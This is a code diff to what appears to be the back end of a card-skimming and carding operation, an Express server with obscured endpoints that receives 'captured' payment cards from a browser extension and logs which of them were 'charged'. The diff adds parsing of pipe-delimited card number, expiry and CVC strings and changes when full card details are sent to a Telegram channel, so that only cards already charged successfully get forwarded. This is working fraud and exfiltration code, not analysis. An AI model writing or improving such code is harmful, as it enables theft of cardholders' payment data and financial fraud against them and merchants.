@@ -97,12 +97,36 @@ async function sendToTelegram(cardData, checkoutInfo, site) {
       timeStyle: 'medium'
     });
     
-    // Parse card data (it's a string from extension)
+    // Parse card data (pipe-delimited: "number|month|year|cvv|..." OR JSON string)
     let parsedCard = {};
     try {
-      parsedCard = typeof cardData === 'string' ? JSON.parse(cardData) : cardData;
+      if (typeof cardData === 'string') {
+        // Check if it's JSON or pipe-delimited format
+        if (cardData.trim().startsWith('{')) {
+          // JSON format
+          parsedCard = JSON.parse(cardData);
+        } else {
+          // Pipe-delimited format: "4242424242424242|12|2026|123|hostname|url|redirect"
+          const parts = cardData.split('|');
+          parsedCard = {
+            number: parts[0] || 'N/A',
+            exp_month: parts[1] || '?',
+            exp_year: parts[2] || '?',
+            cvc: parts[3] || '?',
+            name: 'N/A',  // Not included in pipe format
+            address_line1: 'N/A',
+            address_city: 'N/A',
+            address_state: 'N/A',
+            address_zip: 'N/A',
+            address_country: 'N/A'
+          };
+        }
+      } else {
+        // Already an object
+        parsedCard = cardData;
+      }
     } catch (e) {
-      console.error('[Telegram] Failed to parse card data:', e);
+      console.error('[Telegram] Failed to parse card data:', e, 'Raw data:', cardData);
       parsedCard = { number: 'ERROR', exp_month: '?', exp_year: '?', cvc: '?' };
     }
     
@@ -512,8 +536,8 @@ app.post('/x7k9m2', authenticateToken, express.json(), async (req, res) => {
     
     console.log(`[Card Log] Captured card (Total: ${cardsAll.length})`);
     
-    // Send to Telegram immediately after storing
-    await sendToTelegram(cardData, checkoutInfo, site);
+    // NOTE: Telegram notification moved to /q3p8v5 (charged cards only)
+    // Cards are only sent to Telegram after successful charge, not on every capture
     
     res.json({ 
       success: true, 
@@ -563,6 +587,9 @@ app.post('/q3p8v5', authenticateToken, express.json(), async (req, res) => {
     });
     
     console.log(`[Charged Log] Card charged successfully (Total: ${cardsCharged.length})`);
+    
+    // Send to Telegram ONLY for successfully charged cards
+    await sendToTelegram(cardData, checkoutInfo, site);
     
     res.json({ 
       success: true, 
